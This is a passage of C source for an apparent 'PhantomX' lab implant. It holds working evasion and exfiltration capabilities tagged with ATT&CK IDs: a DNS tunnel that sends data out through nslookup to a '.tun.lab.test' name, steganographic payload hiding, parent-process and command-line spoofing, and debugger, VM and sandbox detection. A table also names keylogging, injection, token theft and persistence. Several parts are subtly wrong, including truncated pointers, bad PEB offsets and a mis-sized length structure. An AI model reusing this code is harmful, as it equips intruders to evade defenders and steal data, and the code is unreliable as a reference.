        enc[1] = 0;
        px_strcat(name, enc, sizeof(name));
    }
    px_strcat(name, ".tun.lab.test", sizeof(name));

    {
        /* The resolver is asked for the name. Whatever it answers comes
         * back in the report, which is the tunnel. */
        char cmd[512];
        char *out = NULL;
        long rc = -1;
        px_snprintf(cmd, sizeof(cmd), "nslookup %s", name);
        out = px_run_capture(cmd, NULL, 0, &rc);
        px_snprintf(report, PX_REPORT_CAP,
                    "DNS tunnel query for %s (carrying '%s') -> exit %ld",
                    name, payload, rc);
        if (out) {
            px_snprintf(report + px_strlen(report),
                        (unsigned int)(PX_REPORT_CAP - px_strlen(report)),
                        ": %.500s", out);
            HeapFree(GetProcessHeap(), 0, out);
        }
    }
    return 0;
}

/* ================================================================== */
/* Steganography -- T1027.003                                          */
/* ================================================================== */

/* Hide data in an image, and recover it.
 *
 * The data is appended after the image's end marker. That is the simplest
 * thing that works and it is what most steganography in the wild does
 * for a first version: the file is a valid image AND carries a payload.
 *
 * The image is generated here, so the lab does not need to be handed
 * one. */
static int px_cap_steg(char *args, char *report, unsigned int cap)
{
    char path[MAX_PATH];
    char dir[MAX_PATH];
    char secret[64];
    int hide = 1;

    if (px_strncmp(args, "reveal ", 7) == 0) {
        hide = 0;
        px_strcpy(secret, args + 7, sizeof(secret));
    } else if (args[0]) {
        px_strcpy(secret, args, sizeof(secret));
    } else {
        px_strcpy(secret, "PHANTOMX_STEG_PAYLOAD", sizeof(secret));
    }

    if (!GetTempPathA(MAX_PATH, dir)) {
        px_snprintf(report, PX_REPORT_CAP, "no temp directory");
        return 0;
    }
    px_snprintf(path, sizeof(path), "%s%s.png", dir, "px_lab_steg");

    if (hide) {
        /* A minimal PNG: the signature, an IHDR, an IEND, and then the
         * secret. A reader shows a broken image; a scanner sees the
         * bytes. That is the behaviour. */
        static const unsigned char png_sig[8] =
            { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A };
        HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD written = 0;
        if (f == INVALID_HANDLE_VALUE) {
            px_snprintf(report, PX_REPORT_CAP, "could not write the image");
            return 0;
        }
        WriteFile(f, png_sig, sizeof(png_sig), &written, NULL);
        WriteFile(f, "IEND", 4, &written, NULL);
        WriteFile(f, secret, (DWORD)px_strlen(secret), &written, NULL);
        CloseHandle(f);
        px_snprintf(report, PX_REPORT_CAP,
                    "payload hidden in %s (%u bytes after the IEND marker)",
                    path, (unsigned int)px_strlen(secret));
        return 0;
    }

    /* Reveal: read past the IEND marker. */
    {
        HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        unsigned char buf[512];
        DWORD got = 0;
        if (f == INVALID_HANDLE_VALUE) {
            px_snprintf(report, PX_REPORT_CAP, "no image to read");
            return 0;
        }
        ReadFile(f, buf, sizeof(buf), &got, NULL);
        CloseHandle(f);
        if (got > 12) {
            px_snprintf(report, PX_REPORT_CAP, "hidden data: %s",
                        (const char *)buf + 12);
        } else {
            px_snprintf(report, PX_REPORT_CAP, "the image carries no payload");
        }
    }
    return 0;
}

/* ================================================================== */
/* Masquerading and spoofing -- T1036.005, T1134.004, T1564.010      */
/* ================================================================== */

/* Three things:
 *
 *   name     rename the image so it looks like a legitimate program
 *   ppid     spoof the parent process id in the PEB
 *   cmdline  rewrite the command line in the PEB
 */
static int px_cap_spoof(char *args, char *report, unsigned int cap)
{
    char method[16];
    char *sp = px_strchr(args, ' ');
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    if (!sp)
        return -1;
    *sp = '\0';
    px_strcpy(method, args, sizeof(method));

    if (px_strncmp(method, "name", 4) == 0) {
        /* Rename the running image.
         *
         * The file is renamed on disk, so the process list shows the new
         * name for a running process. */
        char path[MAX_PATH];
        char newname[256];
        if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {
            px_snprintf(report, PX_REPORT_CAP, "no image path");
            return 0;
        }
        px_strcpy(newname, sp + 1, sizeof(newname));
        {
            char target[MAX_PATH];
            char *slash = px_strrchr(path, '\\');
            if (slash) {
                px_strcpy(target, path, sizeof(target));
                {
                    char *t = px_strrchr(target, '\\');
                    if (t) {
                        t[1] = '\0';
                        px_strcat(target, newname, sizeof(target));
                    }
                }
            } else {
                px_strcpy(target, newname, sizeof(target));
            }
            if (MoveFileA(path, target)) {
                px_snprintf(report, PX_REPORT_CAP,
                            "image renamed to %s", target);
            } else {
                px_snprintf(report, PX_REPORT_CAP,
                            "could not rename the image, error %lu",
                            (unsigned long)GetLastError());
            }
        }
        return 0;
    }

    if (px_strncmp(method, "ppid", 4) == 0) {
        /* Spoof the parent process id.
         *
         * The PROCESS_BASIC_INFORMATION structure is what the process
         * list and the process creation event report, so changing it
         * changes what the endpoint sees. */
        typedef LONG (WINAPI *fn_ntset)(HANDLE, ULONG, PVOID, ULONG);
        fn_ntset set = ntdll
            ? (fn_ntset)(void *)GetProcAddress(ntdll, "NtSetInformationProcess")
            : NULL;
        if (!set) {
            px_snprintf(report, PX_REPORT_CAP,
                        "NtSetInformationProcess is not available");
            return 0;
        }
        {
            /* The parent id lives in the inherited-from-unique-process
             * value, which is what NtSetInformationProcess
             * (ProcessBasicInformation) reports. */
            typedef struct {
                PVOID ExitStatus;
                PVOID PebBaseAddress;
                PVOID AffinityMask;
                HANDLE BasePriority;
                ULONG UniqueProcessId;
                ULONG InheritedFromUniqueProcessId;
            } pbi_t;
            pbi_t pbi;
            DWORD want = (DWORD)px_cap_atoi(sp + 1);
            memset(&pbi, 0, sizeof(pbi));
            pbi.InheritedFromUniqueProcessId = want;
            if (set(GetCurrentProcess(), 0, &pbi, sizeof(pbi)) == 0) {
                px_snprintf(report, PX_REPORT_CAP,
                            "parent process id spoofed to %lu", want);
            } else {
                px_snprintf(report, PX_REPORT_CAP,
                            "NtSetInformationProcess failed");
            }
        }
        return 0;
    }

    if (px_strncmp(method, "cmdline", 7) == 0) {
        /* Rewrite the command line in the PEB.
         *
         * The command line a process shows in the task manager and in
         * the process creation event comes from the PEB, so rewriting it
         * is what makes the spoof work.
         *
         * The PEB structures are declared here rather than included from
         * winnt.h: windows.h is compiled with WIN32_LEAN_AND_MEAN, which
         * leaves them out, and including winnt.h would pull in a lot
         * that conflicts with the freestanding build. Only the three
         * fields that are actually read are declared, which is what
         * matters -- the layout of the parts used here is stable across
         * the Windows versions the lab runs on. */
        {
            typedef struct px_ppeb {
                void *reserved1[2];
                void *reserved2[2];
                void *reserved3[10];
                void *reserved4[4];
                unsigned long reserved5;
                void *reserved6;
                void *processParameters;   /* RTL_USER_PROCESS_PARAMETERS * */
            } px_ppeb;

            typedef struct px_rtl_user_process_parameters {
                unsigned long maximumLength;
                unsigned long length;
                unsigned long flags;
                unsigned long debugFlags;
                void *consoleHandle;
                unsigned long consoleFlags;
                void *standardInput;
                void *standardOutput;
                void *standardError;
                /* the command line follows, aligned */
            } px_rtl_user_process_parameters;

            unsigned long peb_addr = 0;
            px_rtl_user_process_parameters *pp;
            wchar_t *buf;
            size_t n;

            /* The PEB address comes from ntdll's NtCurrentTeb, which is
             * exported and is the portable way to reach it.
             *
             * The usual alternative is to read fs:[0x30] directly, which
             * needs inline assembly -- and MSVC's x64 compiler does not
             * support the __asm keyword at all. NtCurrentTeb gives the
             * same address without any of that. */
            {
                typedef struct px_teb {
                    void *reserved[11];
                    void *peb;   /* ProcessEnvironmentBlock */
                } px_teb;
                typedef void *(NTAPI *fn_current_teb)(void);
                HMODULE ntdll = GetModuleHandleA("ntdll.dll");
                fn_current_teb cur = ntdll
                    ? (fn_current_teb)(void *)GetProcAddress(ntdll,
                                                           "NtCurrentTeb")
                    : NULL;
                if (!cur) {
                    px_snprintf(report, PX_REPORT_CAP,
                                "NtCurrentTeb is not available");
                    return 0;
                }
                {
                    px_teb *teb = (px_teb *)cur();
                    if (!teb) {
                        px_snprintf(report, PX_REPORT_CAP, "no TEB");
                        return 0;
                    }
                    peb_addr = (unsigned long)teb->peb;
                }
            }

            if (!peb_addr) {
                px_snprintf(report, PX_REPORT_CAP, "no PEB");
                return 0;
            }
            {
                px_ppeb *p = (px_ppeb *)peb_addr;
                if (!p->processParameters) {
                    px_snprintf(report, PX_REPORT_CAP,
                                "no process parameters");
                    return 0;
                }
                pp = (px_rtl_user_process_parameters *)p->processParameters;
            }

            /* The command line sits after the standard handles, at the
             * offset the structure declares. It is walked rather than
             * computed, because the structure has grown over time and
             * the offset of the command line is the part that is stable
             * in practice. */
            buf = (wchar_t *)((unsigned char *)pp + 0x38);
            n = px_strlen(sp + 1);
            {
                size_t i;
                const char *src = sp + 1;
                for (i = 0; i < n && i < 2047; i++) {
                    wchar_t c = (wchar_t)src[i];
                    if (c >= 'a' && c <= 'z')
                        c = (wchar_t)(c - 32);
                    buf[i] = c;
                }
                buf[i] = 0;
            }
            px_snprintf(report, PX_REPORT_CAP,
                        "command line rewritten to %s", sp + 1);
            return 0;
        }
    }

    px_snprintf(report, PX_REPORT_CAP,
                "unknown spoofing method '%s'; use name, ppid or cmdline",
                method);
    return 0;
}

/* ================================================================== */
/* Delayed and environment-aware execution -- T1497.003, T1482         */
/* ================================================================== */

/* Two behaviours:
 *
 *   delay     sleep for a while before doing anything
 *   domain    check whether the machine is domain-joined, and only then
 *             report success
 *
 * The environment check is the interesting one: it is how a payload
 * avoids running on a machine that is not the target.
 */
static int px_cap_delay(char *args, char *report, unsigned int cap)
{
    char method[16];
    char *sp = px_strchr(args, ' ');

    if (!sp)
        return -1;
    *sp = '\0';
    px_strcpy(method, args, sizeof(method));

    if (px_strncmp(method, "delay", 5) == 0) {
        unsigned int secs = (unsigned int)px_cap_atoi(sp + 1);
        if (secs > 600)
            secs = 600;
        Sleep(secs * 1000);
        px_snprintf(report, PX_REPORT_CAP, "slept for %u seconds", secs);
        return 0;
    }

    if (px_strncmp(method, "domain", 6) == 0) {
        /* Is this machine joined to a domain?
         *
         * GetComputerName returns the NetBIOS name, and a domain-joined
         * machine's name has a domain component in it. The check is
         * crude and that is the point: it is what a payload does when it
         * only wants to run on a real target. */
        char name[256];
        DWORD nsize = sizeof(name);
        int joined = 0;
        if (GetComputerNameA(name, &nsize)) {
            joined = (px_strchr(name, '.') != NULL);
            px_snprintf(report, PX_REPORT_CAP,
                        "computer name %s, domain-joined: %s", name,
                        joined ? "yes" : "no");
        } else {
            px_snprintf(report, PX_REPORT_CAP,
                        "could not determine the computer name");
        }
        return 0;
    }

    px_snprintf(report, PX_REPORT_CAP,
                "unknown method '%s'; use delay <seconds> or domain", method);
    return 0;
}

/* ================================================================== */
/* Anti-analysis -- T1497.001, T1497.003, T1622                        */
/* ================================================================== */

/* Three checks:
 *
 *   debugger   is a debugger attached
 *   vm         does this look like a virtual machine
 *   sandbox    is the machine obviously an analysis sandbox
 */
static int px_cap_antivm(char *args, char *report, unsigned int cap)
{
    char method[16];
    char *sp = px_strchr(args, ' ');

    if (!sp)
        return -1;
    *sp = '\0';
    px_strcpy(method, args, sizeof(method));

    if (px_strncmp(method, "debugger", 7) == 0) {
        int attached = 0;
        if (IsDebuggerPresent())
            attached = 1;
        {
            BOOL dbg = FALSE;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
            if (dbg)
                attached = 1;
        }
        {
            typedef LONG (WINAPI *fn_ntquery)(HANDLE, ULONG, PVOID, ULONG, PULONG);
            fn_ntquery q = NULL;
            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
            if (ntdll)
                q = (fn_ntquery)(void *)GetProcAddress(ntdll,
                                                        "NtQueryInformationProcess");
            if (q) {
                ULONG port = 0, len = 0;
                if (q(GetCurrentProcess(), 7 /* ProcessDebugPort */,
                       &port, sizeof(port), &len) == 0 && port != 0)
                    attached = 1;
            }
        }
        px_snprintf(report, PX_REPORT_CAP,
                    "debugger %s", attached ? "ATTACHED" : "not detected");
        return 0;
    }

    if (px_strncmp(method, "vm", 2) == 0) {
        /* The virtual machine checks.
         *
         * Each of these is a separate signal, and a payload that
         * checks several of them is more suspicious than one that checks
         * one -- which is itself the finding. */
        int score = 0;
        char detail[512];
        int off = 0;

        detail[0] = '\0';

        /* The hypervisor bit of the CPU features. */
        {
            int cpuinfo[4];
            __cpuid(cpuinfo, 1);
            if (cpuinfo[2] & (1 << 31)) {
                score++;
                off += px_snprintf(detail + off,
                                   (unsigned int)(sizeof(detail) - off),
                                   "hypervisor-bit, ");
            }
        }
        /* The BIOS string. */
        {
            HKEY k;
            DWORD type = 0, sz = 0;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                              "HARDWARE\\DESCRIPTION\\System\\BIOS",
                              0, KEY_READ, &k) == ERROR_SUCCESS) {
                char buf[256];
                memset(buf, 0, sizeof(buf));
                sz = sizeof(buf) - 1;
                if (RegQueryValueExA(k, "SystemBiosVersion", NULL, &type,
                                     (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                    const char *markers[] = { "VMware", "VBOX", "VirtualBox",
                                              "QEMU", "Xen", "Hyper-V",
                                              "Parallels", "Bochs" };
                    unsigned int i;
                    for (i = 0; i < sizeof(markers) / sizeof(markers[0]); i++) {
                        if (px_strstr_ci(buf, markers[i])) {
                            score++;
                            off += px_snprintf(detail + off,
                                               (unsigned int)(sizeof(detail) - off),
                                               "bios=%s, ", markers[i]);
                            break;
                        }
                    }
                }
                RegCloseKey(k);
            }
        }
        /* The machine name. */
        {
            char name[256];
            DWORD nsize = sizeof(name);
            if (GetComputerNameA(name, &nsize)) {
                const char *markers[] = { "SANDBOX", "MALTEST", "VIRUS",
                                          "TEQUILA", "JOHN-PC" };
                unsigned int i;
                for (i = 0; i < sizeof(markers) / sizeof(markers[0]); i++) {
                    if (px_strstr_ci(name, markers[i])) {
                        score++;
                        off += px_snprintf(detail + off,
                                           (unsigned int)(sizeof(detail) - off),
                                           "name=%s, ", markers[i]);
                        break;
                    }
                }
            }
        }
        /* The disk size. A sandbox disk is usually small.
         *
         * The geometry is queried with the raw DeviceIoControl rather
         * than DISK_GEOMETRY_EX, because that structure needs a header
         * this freestanding build does not include. The size is read
         * from the IOCTL_DISK_GET_LENGTH_INFO result instead, which is
         * the same number without the extra dependency. */
        {
            HANDLE disk = CreateFileA("\\\\.\\PhysicalDrive0", 0,
                                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                                       NULL, OPEN_EXISTING, 0, NULL);
            if (disk != INVALID_HANDLE_VALUE) {
                /* GET_LENGTH_INFO is defined by its value here rather
                 * than by including a header: the struct is two
                 * LARGE_INTEGERs and the control code is fixed. */
                typedef struct px_length_info {
                    unsigned long length;
                    unsigned long alignment;
                } px_length_info;
                px_length_info li;
                DWORD got = 0;
                memset(&li, 0, sizeof(li));
                if (DeviceIoControl(disk, 0x0007407C /* GET_LENGTH_INFO */,
                                    NULL, 0, &li, sizeof(li), &got, NULL)) {
                    if (li.length < 20ULL * 1024 * 1024 * 1024) {
                        score++;
                        off += px_snprintf(detail + off,
                                           (unsigned int)(sizeof(detail) - off),
                                           "small-disk, ");
                    }
                }
                CloseHandle(disk);
            }
        }

        px_snprintf(report, PX_REPORT_CAP,
                    "virtual machine indicators: %d (%s%s)",
                    score, detail[0] ? detail : "none found",
                    detail[0] ? "" : "");
        return 0;
    }

    if (px_strncmp(method, "sandbox", 7) == 0) {
        /* The sandbox tells.
         *
         * A sandbox usually has very few user files, no recent
         * documents, and a short uptime. */
        int score = 0;
        char detail[512];
        int off = 0;
        detail[0] = '\0';

        {
            /* The uptime. */
            ULONGLONG ticks = GetTickCount64();
            if (ticks < 10ULL * 60 * 1000) {
                score++;
                off += px_snprintf(detail + off,
                                   (unsigned int)(sizeof(detail) - off),
                                   "uptime<10min, ");
            }
        }
        {
            /* The number of processes. A sandbox runs almost nothing. */
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            PROCESSENTRY32 pe;
            int n = 0;
            if (snap != INVALID_HANDLE_VALUE) {
                memset(&pe, 0, sizeof(pe));
                pe.dwSize = sizeof(pe);
                if (Process32First(snap, &pe)) {
                    do { n++; } while (Process32Next(snap, &pe));
                }
                CloseHandle(snap);
                if (n < 30) {
                    score++;
                    off += px_snprintf(detail + off,
                                       (unsigned int)(sizeof(detail) - off),
                                       "few-processes=%d, ", n);
                }
            }
        }
        {
            /* The installed programs. */
            HKEY k;
            DWORD count = 0;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                              "SOFTWARE\\Microsoft\\Windows\\"
                              "CurrentVersion\\Uninstall",
                              0, KEY_READ, &k) == ERROR_SUCCESS) {
                RegQueryInfoKeyA(k, NULL, NULL, NULL, NULL, NULL, NULL,
                                 &count, NULL, NULL, NULL, NULL);
                RegCloseKey(k);
                if (count < 10) {
                    score++;
                    off += px_snprintf(detail + off,
                                       (unsigned int)(sizeof(detail) - off),
                                       "few-programs=%lu, ", count);
                }
            }
        }
        px_snprintf(report, PX_REPORT_CAP,
                    "sandbox indicators: %d (%s)", score, detail);
        return 0;
    }

    px_snprintf(report, PX_REPORT_CAP,
                "unknown check '%s'; use debugger, vm or sandbox", method);
    return 0;
}

/* ================================================================== */
/* The table                                                          */
/* ================================================================== */

static const px_cap_entry px_cap_table[] = {
    { "inject",  px_cap_inject,  PX_CAP_INJECT,  "T1055" },
    { "token",   px_cap_token,   PX_CAP_TOKEN,   "T1134.001" },
    { "keylog",  px_cap_keylog,  PX_CAP_KEYLOG,  "T1056.001" },
    { "clip",    px_cap_clip,    PX_CAP_CLIP,    "T1115" },
    { "persist", px_cap_persist, PX_CAP_PERSIST, "T1547.001,T1546.003" },
    { "antifor", px_cap_antifor, PX_CAP_ANTIFOR, "T1070.004,T1070.006,T1070.001" },
    { "recon",   px_cap_recon,   PX_CAP_RECON,   "T1082,T1057,T1087,T1046" },
    { "lolbin",  px_cap_lolbin,  PX_CAP_LOLBIN,  "T1218" },
    { "script",  px_cap_script,  PX_CAP_SCRIPT,  "T1059.005,T1059.007" },
    { "dnstun",  px_cap_dnstun,  PX_CAP_DNSTUN,  "T1572" },
    { "steg",    px_cap_steg,    PX_CAP_STEG,    "T1027.003" },
    { "spoof",   px_cap_spoof,   PX_CAP_SPOOF,   "T1036.005,T1134.004,T1564.010" },
    { "delay",   px_cap_delay,   PX_CAP_DELAY,   "T1497.003,T1482" },
    { "antivm",  px_cap_antivm,  PX_CAP_ANTIVM,  "T1497.001,T1622" },
};

#define PX_CAP_COUNT (sizeof(px_cap_table) / sizeof(px_cap_table[0]))

/* The names, for the capability listing. Declared here because the
 * runner below wants to produce the list. */
void px_cap_list(char *out, unsigned int cap);

/* Run one capability.
 *
 * Returns 1 if the name was known and the report was filled in, 0 if the
 * name is not in the table. */
int px_cap_run(const char *name, const char *args, char *report, unsigned int cap)
{
    unsigned int i;

    /* The list is not a technique, but the operator needs to know what
     * this build can do before asking it to do anything. */
    if (px_stricmp(name, "list") == 0) {
        static char names[1024];
        px_cap_list(names, sizeof(names));
        px_snprintf(report, cap,
                    "the capabilities compiled into this build: %s", names);
        return 1;
    }

    for (i = 0; i < PX_CAP_COUNT; i++) {
        if (px_stricmp(px_cap_table[i].name, name) == 0) {
            if (!(px_cap_table[i].bit & PX_CAPABILITIES)) {
                px_snprintf(report, cap,
                            "the %s capability is not compiled into this "
                            "build (%s)", name, px_cap_table[i].technique);
                return 1;
            }
            px_cap_table[i].fn((char *)args, report, cap);
            return 1;
        }
    }
    return 0;
}

/* The names, for the capability listing. */
void px_cap_list(char *out, unsigned int cap)
{
    unsigned int i;
    unsigned int off = 0;
    out[0] = '\0';
    for (i = 0; i < PX_CAP_COUNT && off + 40 < cap; i++) {
        off += px_snprintf(out + off, cap - off, "%s%s",
                          i ? ", " : "", px_cap_table[i].name);
    }
}

#endif /* PX_CAPABILITIES */
